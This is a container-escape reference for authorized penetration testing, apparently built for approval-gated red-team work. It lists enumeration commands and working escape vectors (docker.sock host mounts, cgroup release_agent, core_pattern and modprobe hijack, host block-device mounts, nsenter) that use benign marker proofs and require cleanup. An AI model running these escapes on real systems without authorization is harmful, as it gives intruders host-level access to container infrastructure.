# Container escape reference
# Post-ex, approval-gated. Benign host proof (read a host marker / host-ns id). No persistence/destruction. Cleanup.

## Am I in a container? + enumerate
```
ls -la /.dockerenv ; cat /proc/1/cgroup ; cat /proc/self/status | grep -i cap
amicontained ; capsh --print ; mount ; ls -la /dev ; ls -la /var/run/docker.sock
```

## Escape vectors (benign proof per vector)
```
## 1. --privileged (or cap_sys_admin) -> cgroup release_agent
#   mount a cgroup, set release_agent to a script on the host-visible fs, trigger notify_on_release.
#   Benign: have the release_agent write `id > /host_marker` and read it back. (Classic release_agent PoC.)

## 2. mounted docker.sock  (/var/run/docker.sock present)
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine \
   sh -c 'cat /host/etc/hostname'        # = the NODE hostname (benign host read). Remove the helper container.

## 3. hostPath / host mount visible
ls /host* / mnt ; read a host file through the mount (benign marker).

## 4. cap_sys_admin + no apparmor -> mount host disk / core_pattern
#   core_pattern: write `|/proc/%P/...` handler (host) ; crash a process to trigger. (Advanced; feasibility on prod.)

## 5. Exposed device (/dev/sda*) -> debugfs read-only (prove host fs read)

## 6. Privileged + kernel -> known runc/containerd CVEs (CVE-2019-5736 runc, CVE-2022-0492 cgroups,
#      Leaky Vessels CVE-2024-21626). HIGH RISK — feasibility-first; run only with approval.
```

## Proof + cleanup
Prove host access by reading a file that only exists on the HOST (node hostname, a planted host marker) or
running in the host namespace. Record + remove any helper container/file (`cleanup.md`). No persistence.
Hand the host foothold to `linux-privesc`. Tools: `deepce`, `amicontained`, CDK.

---

## Extended arsenal — enumeration signals (indicator → meaning → vector)

| Signal (how to read it) | What it means | Vector it unlocks |
|---|---|---|
| `capsh --print` lists cap_sys_admin | broad kernel privilege | cgroup-v1 release_agent, mount host disk, core_pattern |
| `capsh --print` lists cap_dac_read_search | bypass file-read perms | open_by_handle_at host-fs read (feasibility) |
| `capsh --print` lists cap_sys_ptrace (+hostPID) | trace host procs | read/inject host process memory (feasibility) |
| `capsh --print` lists cap_sys_module | load kernel modules | insmod a module into the host kernel — catalogue |
| `cat /proc/1/cgroup` path is `/` (no container id) | likely host PID ns / privileged | hostPID vectors, direct host /proc access |
| `ls -la /.dockerenv` present | docker runtime | runtime-socket / known-CVE vectors |
| `ls /var/run/docker.sock` present | docker API reachable | docker.sock → run a host-mounting container |
| `ls /run/containerd/containerd.sock` present | containerd API reachable | CRI → create a host-mount task |
| `mount` shows `/` or a host path rw | host fs mounted in | direct host read/write (marker proof) |
| `ls /dev/sd* /dev/nvme* /dev/mem` present | raw host devices exposed | block-device read / physical-memory read |
| `stat -fc %T /sys/fs/cgroup` = `cgroup2fs` | cgroup v2 | release_agent N/A → use other vectors |
| `/proc/sys/kernel/core_pattern` writable | core handler hijack | core_pattern → host exec on crash |
| `/proc/sys/kernel/modprobe` writable | modprobe path hijack | modprobe trigger → host exec |
| `/sys/kernel/uevent_helper` writable | hotplug helper hijack | uevent → host exec (legacy) |
| `nsenter` present + hostPID | enter host namespaces | `nsenter -t 1 -m -p` (needs caps) |
| `amicontained`: no seccomp + many caps | weak confinement | expands every cap-based vector above |

---

## Extended arsenal — cgroup release_agent: v1 vs v2 differences

```
### Detect the layout FIRST (the classic PoC only works on v1)
stat -fc %T /sys/fs/cgroup            # 'cgroup2fs' = pure v2 ; 'tmpfs' = v1/hybrid
grep -q cgroup2 /proc/filesystems && echo "v2 available"; mount | grep cgroup; cat /proc/self/cgroup
```
```
### cgroup v1 release_agent (needs cap_sys_admin + a v1 hierarchy)
# v1 ONLY: a cgroup carries release_agent; on last-task exit (notify_on_release=1) the kernel runs it AS ROOT ON HOST.
# Benign proof (approval-gated): point release_agent at a script that does `id > /host/<marker>` where /host is a
# HOST-visible path, trigger ONE release, read the marker back, then DELETE the marker + unmount. Record in cleanup.md.
```
```
### cgroup v2 — NO release_agent
# Unified v2 removed release_agent -> the classic PoC does NOT apply. Pivot to: a runtime socket, core_pattern,
# device exposure, or a cap+mount path instead. (Don't waste a cycle trying release_agent on a cgroup2fs host.)
```

---

## Extended arsenal — core_pattern & modprobe handler hijack (feasibility)

```
### /proc/sys/kernel/core_pattern (independent of cgroup version)
cat /proc/sys/kernel/core_pattern            # read current (benign recon)
# A leading '|' pipes core dumps to a HOST program. Feasibility: confirm it's WRITABLE and a crash would reach the
# host handler. Benign proof (approval-gated): set the handler to a script that writes a host-only marker, induce
# ONE controlled crash of a throwaway process, read the marker, RESTORE the original core_pattern, delete the
# marker (cleanup.md). Catalogue, do not auto-fire.
```
```
### /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe                # path the kernel calls to autoload modules
# If writable, point it at a host-side script, then trigger an autoload (a syscall needing an absent module).
# Feasibility-first: confirm writable + a trigger exists. Benign proof mirrors core_pattern (marker→restore→cleanup).
```

---

## Extended arsenal — CAP_DAC_READ_SEARCH + open_by_handle_at (feasibility)

```
# cap_dac_read_search lets open_by_handle_at() open a file by a brute-forced inode file-handle, bypassing the
# mount boundary -> read arbitrary HOST files WITHOUT a mount. Needs the cap + the container sharing the host fs backing.
capsh --print | grep -i dac_read_search      # confirm the cap is held
# Feasibility: cap present + a known host inode to target (e.g. the root inode region near /etc/hostname).
# Benign proof (approval-gated): read ONLY a host marker / the node hostname by handle, show it, store nothing else.
```

---

## Extended arsenal — host block devices & /dev/mem (read-only proof)

```
### Mount a host block device READ-ONLY (proof without any write; needs cap_sys_admin)
ls -l /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null
mkdir -p /mnt/hostdisk && mount -o ro /dev/sda1 /mnt/hostdisk && cat /mnt/hostdisk/etc/hostname   # host read (ro)
umount /mnt/hostdisk ; rmdir /mnt/hostdisk                                     # cleanup — no writes performed
# No-mount alternative (read-only inspect): debugfs -R 'cat /etc/hostname' /dev/sda1
```
```
### Exposed /dev/mem or /dev/kmem (physical memory)
ls -l /dev/mem /dev/kmem 2>/dev/null          # present = raw memory access
# Reading/patching physical memory is HIGH-RISK and can crash the host -> CATALOGUE feasibility only, DO NOT read/write.
# Proof-of-exposure = the node exists + is readable by us (stat), nothing more.
```

---

## Extended arsenal — container runtime sockets (docker / containerd / CRI)

```
ls -l /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock /var/run/crio/crio.sock 2>/dev/null
# docker.sock -> a host-mounting container (in base ref). containerd / CRI equivalents:
ctr -a /run/containerd/containerd.sock version            # reach proof (benign version call)
ctr -a /run/containerd/containerd.sock images ls          # list (read)
crictl --runtime-endpoint unix:///run/crio/crio.sock info # CRI reach proof
# Benign host read via containerd: create ONE throwaway task with / bind-mounted READ-ONLY, cat host /etc/hostname,
# then `ctr task kill` + `ctr container rm` the helper (cleanup.md). crictl against a CRI socket does the equivalent.
```

---

## Extended arsenal — shared host namespaces (hostPID / hostIPC / hostNetwork)

```
### hostPID — host processes visible; another proc's root IS the host fs
cat /proc/1/cgroup                            # '/' or host paths => shared host pid ns
cat /proc/1/root/etc/hostname 2>/dev/null     # read a host file via init's root (if perms allow) = host read
# With cap_sys_admin + hostPID: nsenter -t 1 -m -u -i -n -p -- cat /etc/hostname   # enter host ns (benign read)
### hostIPC — shared SysV shm/semaphores with the host
ipcs                                          # enumerate shared segments (read-only)
### hostNetwork — bind/reach node-local services (127.0.0.1 of the node)
ss -tlnp ; curl -s http://127.0.0.1:10255/pods | head    # reach a node-only API as a benign reach proof
```

---

## Extended arsenal — sysfs uevent / usermodehelper paths

```
cat /sys/kernel/uevent_helper 2>/dev/null     # legacy: kernel runs this on device uevents (often empty/disabled)
# If writable (needs sysfs rw + cap): a device uevent triggers a HOST-side helper. Feasibility-first; benign proof
# mirrors core_pattern (host marker → restore original value → delete marker). Catalogue, do not auto-fire.
# usermodehelper sinks to check for writability (all host-exec on trigger):
for f in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sys/kernel/poweroff_cmd /sys/kernel/uevent_helper; do
  [ -w "$f" ] && echo "WRITABLE: $f"          # read-only probe: just report which sinks are writable
done
```

---

## Extended arsenal — tool enumeration & benign-proof / cleanup contract

| Tool (names only) | Use |
|---|---|
| `amicontained` | caps, seccomp, namespaces, available syscalls |
| `deepce` | container-enum + escape checks |
| `CDK` | evaluate/enum mode; keep exploit stages approval-gated |
| built-ins | `capsh --print` ; `mount` ; `cat /proc/self/status \| grep -i cap` (no tool needed) |

- Proof = read a HOST-only value (node hostname, a planted host marker, a host file via another namespace) OR an
  id in the host namespace — never "we are privileged" alone.
- Every helper container, mount, marker file, or changed kernel knob (core_pattern / modprobe / uevent_helper) is
  RESTORED to its prior value and removed; record each in cleanup.md.
- HIGH-RISK vectors (/dev/mem read, cap_sys_module insmod, kernel-CVE exploits) are CATALOGUED-NOT-FIRED: confirm
  feasibility (device present, cap held, version in range) and stop. No persistence, no destruction, no host DoS.
- Redact any host secret encountered to a fingerprint. Hand the confirmed host foothold to `linux-privesc`.
